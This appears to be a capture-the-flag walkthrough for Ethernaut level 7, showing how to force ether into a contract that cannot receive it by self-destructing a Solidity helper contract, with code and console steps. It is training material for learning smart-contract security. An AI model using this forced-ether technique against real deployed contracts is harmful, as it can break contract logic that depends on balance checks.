# Level 7: Force

This is the level 7 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- [selfdestruct](https://docs.soliditylang.org/en/v0.6.0/units-and-global-variables.html#contract-related) function in Solidity

## Hack

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

`player` has to somehow make this empty contract's balance grater that 0.

Simple `transfer` or `send` won't work because the `Force` implements neither `receive` nor `fallaback` functions. Calls with any value will revert.

However, the checks can be bypassed by using `selfdestruct` of an intermediate contract - `Payer` which would specify `Force`'s address as beneficiary of it's funds after it's self-destruction.

First off make a soon-to-be-destroyed contract in Remix:

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Payer {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}
```

Send a value of say, `10000000000000 wei` (0.00001 eth) by calling `deposit`, so that `Payer`'s balance increases to same amount.

Get instance address of `Force` in console:

```javascript
contact.address

// Output: <your-instance-address>
```

Call `destruct` of `Payer` with `<your-instance-address>` as parameter. That's destroy `Payer` and send all of it's funds to `Force`. Verify by:

```javascript
await getBalance(contract.address)

// Output: '0.00001'
```

Level cracked!


